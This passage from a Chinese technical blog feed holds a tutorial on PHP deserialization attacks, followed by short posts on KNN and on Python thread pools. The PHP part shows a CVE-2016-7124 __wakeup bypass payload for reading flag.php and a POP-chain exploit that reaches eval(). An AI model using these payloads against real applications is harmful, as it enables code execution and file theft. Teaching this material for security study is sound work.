class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$me = unserialize($temp);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果<br><img src="https://img-blog.csdnimg.cn/20200103135151309.png" alt="在这里插入图片描述"></p><p><strong>__toString()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。</span><br><span class="line">例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，</span><br><span class="line">否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br></pre></td></tr></table></figure><p>简单的说就是 把对象用字符串表示，就自动调用这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'zhaibaba'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString:'</span>. <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $me.<span class="string">'&lt;br&gt;'</span>;</span><br></pre></td></tr></table></figure><p>结果<br><img src="https://img-blog.csdnimg.cn/20200103141055940.png" alt="在这里插入图片描述"></p><h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a>绕过__wakeup()方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span> ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下源码，<code>__destruct方法中show_source(dirname (__FILE__).&#39;/&#39;.$this \-&gt;file);</code>会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，<code>但是__wakeup会在unserialize之前执行，所以要绕过这一点。</code></p><p><strong>这里就要用到CVE-2016-7124漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>构造序列化对象：O:5:“SoFun”:<strong>1</strong>:{S:7:”\00*\00file”;s:8:“flag.php”;}<br>绕过__wakeup：O:5:“SoFun”:<strong>2</strong>:{S:7:”\00*\00file”;s:8:“flag.php”;}</p><p>注意：因为file是protect属性，所以需要加上\00*\00。再base64编码。<br>payload：Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h2 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h2><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p><h2 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;zhaibaba);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li>string1中的__tostring存在$this-&gt;str1-&gt;get_flag()，分析一下要自动调用__tostring()需要把类string1当成字符串来使用，因为调用的是参数str1的方法，所以需要把str1赋值为类GetFlag的对象。</li><li>发现类func中存在__invoke方法执行了字符串拼接，需要把func当成函数使用自动调用__invoke然后把 m o d 1 赋 值 为 s t r i n g 1 的 对 象 与 mod1赋值为string1的对象与 mod1赋值为string1的对象与mod2拼接。</li><li>在funct中找到了函数调用，需要把mod1赋值为func类的对象，又因为函数调用在__call方法中，且参数为$test2,即无法调用test2方法时自动调用 __call方法；</li><li>在Call中的test1方法中存在 t h i s − &gt; m o d 1 − &gt; t e s t 2 ( ) ; ， 需 要 把 this-&gt;mod1-&gt;test2();，需要把 this−&gt;mod1−&gt;test2();，需要把mod1赋值为funct的对象，让__call自动调用。</li><li>查找test1方法的调用点，在start_gg中发现 t h i s − &gt; m o d 1 − &gt; t e s t 1 ( ) ; ， 把 this-&gt;mod1-&gt;test1();，把 this−&gt;mod1−&gt;test1();，把mod1赋值为start_gg类的对象，等待__destruct()自动调用。</li></ol><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();<span class="comment">//把$mod1赋值为Call类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();<span class="comment">//把 $mod1赋值为funct类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> func();<span class="comment">//把 $mod1赋值为func类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> string1();<span class="comment">//把 $mod1赋值为string1类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1= <span class="keyword">new</span> GetFlag();<span class="comment">//把 $str1赋值为GetFlag类对</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;zhaibaba = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KNN算法</title>
      <link href="/2020/01/02/KNN%E7%AE%97%E6%B3%95/"/>
      <url>/2020/01/02/KNN%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>1、KNN算法概述</p><p>kNN算法的核心思想是如果一个样本在特征空间中的k个最相邻的样本中的大多数属于某一个类别，则该样本也属于这个类别，并具有这个类别上样本的特性。该方法在确定分类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。</p><p>2、KNN算法介绍</p><p>最简单最初级的分类器是将全部的训练数据所对应的类别都记录下来，当测试对象的属性和某个训练对象的属性完全匹配时，便可以对其进行分类。但是怎么可能所有测试对象都会找到与之完全匹配的训练对象呢，其次就是存在一个测试对象同时与多个训练对象匹配，导致一个训练对象被分到了多个类的问题，基于这些问题呢，就产生了KNN。</p><p>KNN是通过测量不同特征值之间的距离进行分类。它的的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。K通常是不大于20的整数。KNN算法中，所选择的邻居都是已经正确分类的对象。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。</p><p><img src="https://img-blog.csdnimg.cn/20200102145718237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200102145844225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能机器学习与安全研究部 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进程池，线程池使用</title>
      <link href="/2019/12/31/%E8%BF%9B%E7%A8%8B%E6%B1%A0%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/12/31/%E8%BF%9B%E7%A8%8B%E6%B1%A0%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a><strong>进程的概念</strong></h2><p>第一，进程是一个实体。每一个进程都有它自己的地址空间，一般情况下，包括文本区域（text region）、数据区域（data region）和堆栈（stack region）。文本区域存储处理器执行的代码；数据区域存储变量和进程执行期间使用的动态分配的内存；堆栈区域存储着活动过程调用的指令和本地变量。<br>第二，进程是一个“执行中的程序”。程序是一个没有生命的实体，只有处理器赋予程序生命时（操作系统执行之），它才能成为一个活动的实体，我们称其为进程。[3]<br>进程是操作系统中最基本、重要的概念。是多道程序系统出现后，为了刻画系统内部出现的动态情况，描述系统内部各道程序的活动规律引进的一个概念,所有多道程序设计操作系统都建立在进程的基础上。</p><h2 id="引入进程原因"><a href="#引入进程原因" class="headerlink" title="引入进程原因"></a>引入进程原因</h2><ol><li>为了提高资源利用率和系统处理能力，现阶段计算机系统都是多道程序系统，即多道程序并发执行。</li><li>优化系统资源，方便计算机调度，避免系统运算紊乱。</li></ol><h2 id="进程的并行与并发"><a href="#进程的并行与并发" class="headerlink" title="进程的并行与并发"></a>进程的并行与并发</h2><p><strong>并行</strong>：并行是指两者同时执行，比如赛跑，两个人都在不停的往前跑；（资源够用，比如三个线程，四核CPU）</p><p><strong>并发</strong>：并行是指资源有限的情况下，两者交替轮流使用资源，比如一段路（单核CPU资源）同时只能过一个人，A走一段后，让给B，B用完继续给A，交替使用，目的是提高效率。</p><p>并行简图</p><p><img src="https://img-blog.csdnimg.cn/20191231104624807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并发（线程）<br><img src="https://img-blog.csdnimg.cn/20191231104643694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="二、进程线程"><a href="#二、进程线程" class="headerlink" title="二、进程线程"></a>二、进程线程</h2><p>1、进程<br>程序仅仅只是一堆代码而已，而进程指的是程序的运行过程。需要强调的是：同一个程序执行两次，那也是两个进程。<br>进程：资源管理单位（容器）。<br>线程：最小执行单位，管理线程的是进程。</p><p>进程就是一个程序在一个数据集上的一次动态执行过程。进程一般由程序、数据集、进程控制块三部分组成。我们编写的程序用来描述进程要完成哪些功能以及如何完成；数据集则是程序在执行过程中所需要使用的资源；进程控制块用来记录进程的外部特征，描述进程的执行变化过程，系统可以利用它来控制和管理进程，它是系统感知进程存在的唯一标志。</p><p>2、线程<br>线程的出现是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能。<br>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p><p>3、线程与进程关系<br>在传统操作系统中，每个进程有一个地址空间，而且默认就有一个控制线程。<br>多线程（即多个控制线程）的概念是，在一个进程中存在多个控制线程，控制该进程的地址空间。<br>进程只是用来把资源集中到一起（进程只是一个资源单位，或者说资源集合），而线程才是cpu上的执行单位。</p><p>进程和线程的关系：<br>(1)一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。<br>(2)资源分配给进程，同一进程的所有线程共享该进程的所有资源。<br>(3)CPU分给线程，即真正在CPU上运行的是线程。</p><p><strong>一、为什么要引入线程池</strong><br>Python中已经有了threading模块，为什么还需要线程池呢 ？<br>当写爬虫时，需要控制同时爬取的线程数，如果创建了20个线程，而同时只允许3个线程在运行，但是20个线程都需要创建和销毁，线程的创建是需要消耗系统资源的，有没有更好的方案呢？<br>其实只需要三个线程就行了，每个线程各分配一个任务，剩下的任务排队等待，当某个线程完成了任务的时候，排队任务就可以安排给这个线程继续执行。</p><h2 id="线程池使用方法"><a href="#线程池使用方法" class="headerlink" title="线程池使用方法"></a>线程池使用方法</h2><p>pip install threadpool</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool = ThreadPool(poolsize)  </span><br><span class="line">requests = makeRequests(some_callable, list_of_args, callback)  </span><br><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req in requests]  </span><br><span class="line">pool.wait()</span><br></pre></td></tr></table></figure><p>第一行定义了一个线程池，表示最多可以创建poolsize这么多线程；</p><p>第二行是调用makeRequests创建了要开启多线程的函数，以及函数相关参数和回调函数，其中回调函数可以不写，default是无，也就是说makeRequests只需要2个参数就可以运行；</p><p>第三行用法比较奇怪，是将所有要运行多线程的请求扔进线程池，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req in requests]等同于</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">for</span> req in requests:  </span><br><span class="line"></span><br><span class="line">　　　　 pool.putRequest(req)</span><br></pre></td></tr></table></figure><p>第四行是等待所有的线程完成工作后退出。</p><ul><li>我的测试样例是 